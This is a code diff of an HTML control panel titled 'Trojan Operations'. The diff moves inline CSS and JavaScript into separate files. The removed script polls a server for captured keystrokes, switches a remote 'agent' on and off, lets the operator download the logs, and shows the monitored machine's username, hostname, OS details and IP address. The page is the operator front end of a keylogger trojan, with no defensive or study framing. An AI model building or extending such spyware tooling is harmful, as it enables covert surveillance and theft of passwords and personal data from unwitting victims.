@@ -1,303 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <title>Trojan Operations</title>
-    <style>
-        body {
-            font-family: "Segoe UI", sans-serif;
-            background-color: #f9f9f9;
-            margin: 0;
-            padding: 0;
-            color: #000000;
-        }
-
-        .navbar {
-            background-color: #005f73;
-            padding: 20px;
-            transition: background-color 0.3s ease;
-            display: flex;
-            /* align-items: baseline; */
-            justify-content: space-between;
-        }
-
-        .navbar h1 {
-            margin: 0 0 10px;
-            color: white;
-            font-size: 24px;
-        }
-
-        .button-group {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-
-        .navbtn {
-            display: flex;
-            /* border:2px solid red; */
-            
-            
-        }
-
-        .toggle-container {
-            display: flex;
-            justify-content: space-between;
-            flex: 1;
-        }
-
-        .links {
-            display: flex;
-            gap: 20px;
-            color: white;
-            flex-direction: row;
-            align-items:end;
-            margin-right: 10px;
-            
-            
-            transition: color 0.3s ease;
-        }
-        .links h3 a {
-            text-decoration: none;
-            color: white;
-            font-size: 18px;
-        }
-
-        .links h3 {
-            margin: 0;
-          
-        }
-
-        .links h3:hover {
-            text-decoration: underline;
-
-        }
-
-        .container {
-            padding: 30px;
-        }
-
-        h2 {
-            margin-top: 0;
-        }
-
-        .log-box {
-            position: relative;
-            background-color: #fff;
-            border: 1px solid #ccc;
-            padding: 15px;
-            height: 60vh;
-            overflow-y: auto;
-            border-radius: 5px;
-            white-space: pre-wrap;
-            font-family: monospace;
-        }
-
-        .log-box::after {
-            content: url('key.png');
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            scale: 3.8;
-            transform: translate(-10%, -10%);
-            opacity: 0.2;
-        }
-
-        .log-actions {
-            position: absolute;
-            top: 8px;
-            right: 10px;
-            display: flex;
-            gap: 8px;
-        }
-
-        .log-actions button {
-            background-color: #eee;
-            color: #333;
-            border: 1px solid #ccc;
-            padding: 4px 10px;
-            font-size: 12px;
-            cursor: pointer;
-            border-radius: 3px;
-        }
-
-        .log-actions button:hover {
-            background-color: #ddd;
-        }
-
-        .toggle-switch {
-            position: relative;
-            display: inline-block;
-            width: 100px;
-            height: 40px;
-            background-color: #ccc;
-            border-radius: 10px;
-            transition: background-color 0.3s ease;
-            cursor: pointer;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
-            border: 2px solid #000000;
-            padding: 4px;
-        }
-
-        .toggle-switch input {
-            opacity: 0;
-            width: 0;
-            height: 0;
-        }
-
-        .slider-square {
-            position: absolute;
-            height: 36px;
-            width: 48px;
-            left: 2px;
-            top: 2px;
-            background-color: white;
-            color: black;
-            border-radius: 10px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            transition: all 0.3s ease;
-            user-select: none;
-            border: 2px solid #000;
-            padding: 2px;
-            font-size: small;
-        }
-
-        .toggle-switch input:checked + .slider-square {
-            left: 50px;
-        }
-
-        #people-output {
-            font-family: monospace;
-            white-space: pre-wrap;
-            word-break: break-all;
-            width: auto;
-            padding: 10px;
-            background-color: #f0f0f0;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            overflow-x: auto;
-            max-height: 60vh;
-            margin-top: 10px;
-            font-size: 14px;
-            color: #333;
-        }
-
-        .system-info {
-            margin-top: 20px;
-            padding: 10px;
-            background-color: #f0f0f0;
-            border-radius: 5px;
-        }
-
-        .system-info table {
-            width: 100%;
-            border-collapse: collapse;
-        }
-
-        .system-info th,
-        .system-info td {
-            padding: 10px;
-            border: 1px solid #ccc;
-            text-align: left;
-        }
-
-        .system-info th {
-            background-color: #e0f7fa;
-            color: #005f73;
-        }
-
-        .system-info td {
-            background-color: #f9f9f9;
-            color: #333;
-        }
-
-        .system-info tr:nth-child(even) {
-            background-color: #f1f1f1;
-        }
-
-        .system-info tr:hover {
-            background-color: #e0f7fa;
-        }
-
-        #sysbtn {
-            background-color: #0a9396;
-            color: white;
-            border: none;
-            padding: 10px 16px;
-            font-size: 14px;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-
-        #sysbtn:hover {
-            background-color: #007f89;
-        }
-
-        .syscont {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 20px;
-        }
-
-        .keycont {
-            display: flex;
-            justify-content: space-between;
-            align-items: baseline;
-            margin-bottom: 20px;
-        }
-
-        .keybtn {
-            display: flex;
-            gap: 10px;
-        }
-        #inttext {
-           
-            margin-top:5px;
-           
-        }
-
-        .keybtn button {
-            background-color: #0a9396;
-            color: white;
-            border: none;
-            padding: 10px 16px;
-            font-size: 14px;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-
-        .keybtn button:hover {
-            background-color: #007f89;
-        }
-
-        .keycont select {
-            padding: 5px;
-            border-radius: 4px;
-            border: 1px solid #ccc;
-            font-size: 14px;
-        }
-
-        .keycont select:focus {
-            border-color: #0a9396;
-            outline: none;
-        }
-
-        /* Hover effects for nav text */
-        .keycont:hover ~ .navbar .links h3:first-child,
-        .log-box:hover ~ .navbar .links h3:first-child {
-            color: yellow;
-        }
-
-        .syscont:hover ~ .navbar .links h3:last-child,
-        .system-info:hover ~ .navbar .links h3:last-child {
-            color: yellow;
-        }
-    </style>
+    <link rel="stylesheet" href="style.css">
 </head>
+
 <body>
     <div class="navbar">
         <div class="hero">
@@ -311,168 +20,101 @@
                 </label>
             </div>
         </div>
-            <div class="navbtn">
-                <div class="links">
-                    <h3 id="navbar-keylogger"><a href="#keylogger">Keylogger</a></h3>
-                    <h3 id="navbar-sysinfo"><a href="#sysdiv">System Info</a></h3>
-                </div>
+        <div class="navbtn">
+            <div class="links">
+                <h3 id="navbar-keylogger"><a href="#keylogger">Keylogger</a></h3>
+                <h3 id="navbar-sysinfo"><a href="#sysdiv">System Info</a></h3>
             </div>
-        
+        </div>
+
     </div>
 
     <div class="container">
         <div id="keylogger">
-        <div class="keycont">
-            <h2>Captured Keystrokes</h2>
-            <div class="keybtn">
-                <label for="interval" id="inttext">Select Interval (seconds):</label>
-                <select id="interval" name="interval">
-                    <option value="5">5</option>
-                    <option value="10">10</option>
-                    <option value="60">60</option>
-                    <option value="120">120</option>
+            <div class="keycont">
+                <h2>Captured Keystrokes</h2>
+                <div class="keybtn">
+                    <label for="interval" id="inttext">Select Interval (seconds):</label>
+                    <select id="interval" name="interval">
+                        <option value="5">5</option>
+                        <option value="10">10</option>
+                        <option value="60">60</option>
+                        <option value="120">120</option>
 
-                </select>
-                <button onclick="fetchPeople()">Fetch</button>
-                <button onclick="reloadSession()">Clear</button>
+                    </select>
+                    <button onclick="fetchPeople()">Fetch</button>
+                    <button onclick="reloadSession()">Clear</button>
+                </div>
             </div>
-        </div>
 
-        <div class="log-box" id="log-container">
-            <div class="log-actions">
-                <button onclick="copyToClipboard()">Copy</button>
-                <button onclick="downloadLog()">Download</button>
+            <div class="log-box" id="log-container">
+                <div class="log-actions">
+                    <button onclick="copyToClipboard()">Copy</button>
+                    <button onclick="downloadLog()">Download</button>
+                </div>
+                <pre id="people-output">[Keystroke logs will appear here]</pre>
             </div>
-            <pre id="people-output">[Keystroke logs will appear here]</pre>
-        </div>
         </div>
         <div id="sysdiv">
-        <div class="syscont">
-            <h2>System Information</h2>
-            <button onclick="fetchUserInfo()" id="sysbtn">Fetch</button>
+            <div class="syscont">
+                <h2>System Information</h2>
+                <button onclick="fetchUserInfo()" id="sysbtn">Fetch</button>
+            </div>
+
+            <div class="system-info">
+                <div id="system-info-table">
+                    <table>
+                        <tr>
+                            <th>Username</th>
+                            <td id="username">Loading...</td>
+                        </tr>
+                        <tr>
+                            <th>Operating System</th>
+                            <td id="os">Loading...</td>
+                        </tr>
+                        <tr>
+                            <th>Hostname</th>
+                            <td id="hostname">Loading...</td>
+                        </tr>
+                        <tr>
+                            <th>Platform</th>
+                            <td id="platform">Loading...</td>
+                        </tr>
+                        <tr>
+                            <th>OS Version</th>
+                            <td id="os_version">Loading...</td>
+                        </tr>
+                        <tr>
+                            <th>Architecture</th>
+                            <td id="architecture">Loading...</td>
+                        </tr>
+                        <tr>
+                            <th>Processor</th>
+                            <td id="processor">Loading...</td>
+                        </tr>
+                        <tr>
+                            <th>CPU Count</th>
+                            <td id="cpu_count">Loading...</td>
+                        </tr>
+                        <tr>
+                            <th>RAM (GB)</th>
+                            <td id="ram_gb">Loading...</td>
+                        </tr>
+                        <tr>
+                            <th>Current Time</th>
+                            <td id="current_time">Loading...</td>
+                        </tr>
+                        <tr>
+                            <th>IP Address</th>
+                            <td id="ip_address">Loading...</td>
+                        </tr>
+                    </table>
+                </div>
+            </div>
         </div>
-
-        <div class="system-info">
-           <div id="system-info-table">
-        <table>
-        <tr><th>Username</th>         <td id="username">Loading...</td></tr>
-        <tr><th>Operating System</th> <td id="os">Loading...</td></tr>
-        <tr><th>Hostname</th>         <td id="hostname">Loading...</td></tr>
-        <tr><th>Platform</th>         <td id="platform">Loading...</td></tr>
-        <tr><th>OS Version</th>       <td id="os_version">Loading...</td></tr>
-        <tr><th>Architecture</th>     <td id="architecture">Loading...</td></tr>
-        <tr><th>Processor</th>        <td id="processor">Loading...</td></tr>
-        <tr><th>CPU Count</th>        <td id="cpu_count">Loading...</td></tr>
-        <tr><th>RAM (GB)</th>         <td id="ram_gb">Loading...</td></tr>
-        <tr><th>Current Time</th>     <td id="current_time">Loading...</td></tr>
-        <tr><th>IP Address</th>       <td id="ip_address">Loading...</td></tr>
-        </table>
-    </div>
-        </div>
-    </div>
     </div>
 
-    <script>
-        function controlAgent(action) {
-            fetch("/" + action, { method: "POST" })
-                .then(() => console.log("Agent " + action + "ed"))
-                .catch(err => console.log("Error: " + err));
-        }
-
-        function fetchPeople() {
-            const unique = new Date().getTime();
-            fetch("/people?nocache=" + unique)
-                .then(res => res.text())
-                .then(data => {
-                    document.getElementById("people-output").innerText = data || "[No activity captured yet]";
-                })
-                .catch(err => console.error("Error fetching data:", err));
-        }
-        function reloadSession() {
-            fetch("/reload", { method: "POST" })
-                .then(() => {
-                    document.getElementById("people-output").innerText = "[Log cleared. Start typing again.]";
-                    alert("Log cleared");
-                })
-                .catch(err => alert("Error: " + err));
-        }
-
-        function downloadLog() {
-            window.location.href = "/download";
-        }
-
-        function copyToClipboard() {
-            const text = document.getElementById("people-output").innerText;
-            navigator.clipboard.writeText(text)
-                .then(() => alert("Copied to clipboard!"));
-        }
-
-        function toggleAgent(checkbox) {
-            const slider = document.getElementById("slider-square");
-            const toggleTrack = document.getElementById("toggle-track");
-            const navbar = document.querySelector(".navbar");
-
-            if (checkbox.checked) {
-                slider.textContent = "START";
-                toggleTrack.style.backgroundColor = "#ccffcc";
-                navbar.style.backgroundColor = "#54b654"; // light green
-                controlAgent('start');
-            } else {
-                slider.textContent = "STOP";
-                toggleTrack.style.backgroundColor = "#ffcccc";
-                navbar.style.backgroundColor = "#fa3b3b"; // light red
-                controlAgent('stop');
-            }
-        }
-        let intervalId = null;
-        function interval_set() {
-        const interval = parseInt(document.getElementById("interval").value);
-        clearInterval(intervalId);
-        intervalId = setInterval(fetchPeople, interval * 1000);
-        }
-
-    
-        window.addEventListener("DOMContentLoaded", () => {
-            interval_set(); // Start default interval
-
-        // Update interval when select changes
-            document.getElementById("interval").addEventListener("change", interval_set);
-        });
-        
-        window.onload = function () {
-            const toggle = document.getElementById("agent-toggle");
-            toggleAgent(toggle);
-        };
-
-         function fetchUserInfo() {
-    fetch('/api/userinfo')
-        .then(response => response.json())
-        .then(data => {
-            if (!data || data.length === 0) {
-                alert("No user info collected yet.");
-                return;
-            }
-
-            const latest = data[data.length - 1];
-
-            document.getElementById("username").innerText       = latest.username || "N/A";
-            document.getElementById("hostname").innerText       = latest.hostname || "N/A";
-            document.getElementById("os").innerText             = latest.os || "N/A";
-            document.getElementById("os_version").innerText     = latest.os_version || "N/A";
-            document.getElementById("platform").innerText       = latest.platform || "N/A";
-            document.getElementById("architecture").innerText   = latest.architecture || "N/A";
-            document.getElementById("processor").innerText      = latest.processor || "N/A";
-            document.getElementById("cpu_count").innerText      = latest.cpu_count || "N/A";
-            document.getElementById("ram_gb").innerText         = latest.ram_gb + " GB" || "N/A";
-            document.getElementById("current_time").innerText   = latest.current_time || "N/A";
-            document.getElementById("ip_address").innerText     = latest.ip_address || "N/A";
-        })
-        .catch(err => {
-            console.error("Failed to fetch user info:", err);
-            alert("Error fetching system info.");
-        });
-}
-
-    </script>
+    <script src="script.js"></script>
 </body>
+
 </html>
